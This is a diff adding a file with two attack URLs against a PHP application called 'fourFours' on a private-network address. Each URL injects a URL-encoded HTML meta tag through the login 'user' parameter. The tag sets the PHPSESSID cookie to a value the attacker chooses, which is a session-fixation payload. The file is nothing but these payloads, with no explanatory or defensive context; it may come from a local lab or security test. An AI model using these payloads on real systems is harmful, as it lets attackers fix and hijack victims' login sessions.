@@ -1,0 +1,4 @@
+http://192.168.0.100/fourFours/index.php?operation=login&user=sid%3Cmeta+http-equiv%3D%22Set-Cookie%22+content%3D%22PHPSESSID%3Ds%3B+path%3D%2F%22%3E
+
+http://192.168.0.100/fourFours/index.php?operation=login&user=sid%3Cmeta+http-equiv%3D%22Set-Cookie%22+content%3D%22PHPSESSID%3D2df61dbeae62a06459e60a9abe588961%3B+path%3D%2F%22%3E
+
